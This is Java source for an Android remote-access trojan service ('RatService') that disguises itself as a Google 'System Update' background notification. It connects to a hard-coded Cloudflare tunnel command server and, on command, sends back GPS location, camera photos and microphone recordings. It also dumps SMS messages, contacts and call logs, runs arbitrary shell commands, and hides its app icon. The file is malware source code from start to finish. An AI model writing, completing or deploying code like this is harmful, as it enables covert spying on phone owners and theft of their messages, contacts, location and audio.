package com.google.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RatService extends Service {
    
    private static final String SERVER_URL = "lamp-paint-coaching-awareness.trycloudflare.com";
    private static final int SERVER_PORT = 443;
    
    private Socket socket;
    private boolean isRunning = true;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String recordingPath = "";
    private Camera camera;
    
    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        ignoreBatteryOptimizations();
    }
    
    private void startForegroundService() {
        String channelId = "system_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        
        Notification notification = new NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        
        startForeground(1, notification);
    }
    
    private void ignoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                // Already requested in MainActivity
            }
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> connectToServer()).start();
        return START_STICKY;
    }
    
    private void connectToServer() {
        while (isRunning) {
            try {
                socket = new Socket(SERVER_URL, SERVER_PORT);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                
                // تسجيل الجهاز
                String deviceInfo = String.format(
                    "{\"type\":\"register\",\"device\":\"%s\",\"android\":\"%s\",\"battery\":%d}",
                    Build.MODEL,
                    Build.VERSION.RELEASE,
                    getBatteryLevel()
                );
                out.println(deviceInfo);
                
                // الاستماع للأوامر
                String line;
                while ((line = in.readLine()) != null) {
                    executeCommand(line, out);
                }
                
                socket.close();
            } catch (Exception e) {
                Log.e("RAT", "Connection error: " + e.getMessage());
            }
            
            try {
                Thread.sleep(30000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
    
    private void executeCommand(String command, PrintWriter out) {
        String[] parts = command.split("\\|");
        String cmd = parts[0];
        
        try {
            switch (cmd) {
                case "location":
                    sendLocation(out);
                    break;
                case "camera_front":
                    captureCamera(true, out);
                    break;
                case "camera_back":
                    captureCamera(false, out);
                    break;
                case "mic_start":
                    startRecording(out);
                    break;
                case "mic_stop":
                    stopRecording(out);
                    break;
                case "sms":
                    getSMS(out);
                    break;
                case "contacts":
                    getContacts(out);
                    break;
                case "call_log":
                    getCallLog(out);
                    break;
                case "shell":
                    String shellCmd = parts.length > 1 ? parts[1] : "";
                    executeShell(shellCmd, out);
                    break;
                case "vibrate":
                    vibrate(out);
                    break;
                case "open_url":
                    String url = parts.length > 1 ? parts[1] : "";
                    openUrl(url);
                    out.println("open_url|ok");
                    break;
                case "hide_icon":
                    hideIcon();
                    out.println("hide_icon|ok");
                    break;
                case "uninstall":
                    uninstallSelf();
                    out.println("uninstall|ok");
                    break;
                default:
                    out.println("unknown|" + cmd);
            }
        } catch (Exception e) {
            out.println("error|" + cmd + "|" + e.getMessage());
        }
    }
    
    private void sendLocation(PrintWriter out) {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (location != null) {
                out.println(String.format("location|%f,%f", location.getLatitude(), location.getLongitude()));
            } else {
                out.println("location|failed");
            }
        } catch (Exception e) {
            out.println("location|error:" + e.getMessage());
        }
    }
    
    private void captureCamera(boolean front, PrintWriter out) {
        try {
            int cameraId = 0;
            if (front && Camera.getNumberOfCameras() > 1) {
                cameraId = Camera.getNumberOfCameras() - 1;
            }
            camera = Camera.open(cameraId);
            camera.startPreview();
            Thread.sleep(500);
            
            camera.takePicture(null, null, (data, camera) -> {
                String path = getExternalCacheDir() + "/camera_" + System.currentTimeMillis() + ".jpg";
                try {
                    FileOutputStream fos = new FileOutputStream(path);
                    fos.write(data);
                    fos.close();
                    out.println("camera|" + path);
                } catch (Exception e) {
                    out.println("camera|error:" + e.getMessage());
                }
                camera.stopPreview();
                camera.release();
            }, null);
        } catch (Exception e) {
            out.println("camera|error:" + e.getMessage());
        }
    }
    
    private void startRecording(PrintWriter out) {
        if (isRecording) return;
        try {
            recordingPath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(recordingPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            out.println("mic_start|recording");
        } catch (Exception e) {
            out.println("mic_start|error:" + e.getMessage());
        }
    }
    
    private void stopRecording(PrintWriter out) {
        if (!isRecording) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            out.println("mic_stop|" + recordingPath);
        } catch (Exception e) {
            out.println("mic_stop|error:" + e.getMessage());
        }
    }
    
    private void getSMS(PrintWriter out) {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 50"
            );
            StringBuilder sb = new StringBuilder();
            while (cursor != null && cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append(address).append(": ").append(body).append("\n");
            }
            if (cursor != null) cursor.close();
            out.println("sms|" + (sb.length() > 0 ? sb.toString() : "none"));
        } catch (Exception e) {
            out.println("sms|error:" + e.getMessage());
        }
    }
    
    private void getContacts(PrintWriter out) {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            StringBuilder sb = new StringBuilder();
            while (cursor != null && cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(": ").append(number).append("\n");
            }
            if (cursor != null) cursor.close();
            out.println("contacts|" + (sb.length() > 0 ? sb.toString() : "none"));
        } catch (Exception e) {
            out.println("contacts|error:" + e.getMessage());
        }
    }
    
    private void getCallLog(PrintWriter out) {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "date DESC LIMIT 50"
            );
            StringBuilder sb = new StringBuilder();
            while (cursor != null && cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                String typeStr = "";
                switch (type) {
                    case "1": typeStr = "IN"; break;
                    case "2": typeStr = "OUT"; break;
                    case "3": typeStr = "MISS"; break;
                }
                sb.append(typeStr).append(": ").append(number).append("\n");
            }
            if (cursor != null) cursor.close();
            out.println("call_log|" + (sb.length() > 0 ? sb.toString() : "none"));
        } catch (Exception e) {
            out.println("call_log|error:" + e.getMessage());
        }
    }
    
    private void executeShell(String cmd, PrintWriter out) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            out.println("shell|" + (output.length() > 0 ? output.toString() : "done"));
        } catch (Exception e) {
            out.println("shell|error:" + e.getMessage());
        }
    }
    
    private void vibrate(PrintWriter out) {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(3000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(3000);
            }
            out.println("vibrate|ok");
        } catch (Exception e) {
            out.println("vibrate|error:" + e.getMessage());
        }
    }
    
    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("RAT", "Open URL error: " + e.getMessage());
        }
    }
    
    private void hideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e("RAT", "Hide icon error: " + e.getMessage());
        }
    }
    
    private void uninstallSelf() {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("RAT", "Uninstall error: " + e.getMessage());
        }
    }
    
    private int getBatteryLevel() {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
        return (level != -1 && scale != -1) ? (level * 100 / scale) : -1;
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        try {
            if (socket != null) socket.close();
            if (mediaRecorder != null) mediaRecorder.release();
            if (camera != null) camera.release();
        } catch (Exception e) { }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
